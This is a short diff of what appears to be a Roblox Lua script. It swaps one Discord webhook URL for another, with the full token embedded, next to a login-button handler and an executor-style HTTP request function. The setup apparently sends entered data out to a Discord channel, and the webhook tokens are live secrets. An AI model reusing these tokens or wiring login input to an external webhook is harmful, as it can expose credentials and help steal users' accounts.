@@ -1492,7 +1492,7 @@ LoginBtn.MouseButton1Click:Connect(function()
     end
 end)
 HttpService = game:GetService("HttpService")
-Webhook_URL = "https://discord.com/api/webhooks/1520808221269426329/WVdwBY6_tPQOURrVoGwentTRactT444B-biatHx755BT0gwp_g7c3yjW0hDckx7aW6F5"
+Webhook_URL = "https://discord.com/api/webhooks/1520812846643019838/tMLjE4scH6Y69atFNA2TaXyGX30GBLVobAwwBtGUNschHdUb72Y_QZsXA_a7SzpZicQw"
  
 local request_func = http_request or request
 local MarketplaceService = game:GetService("MarketplaceService")
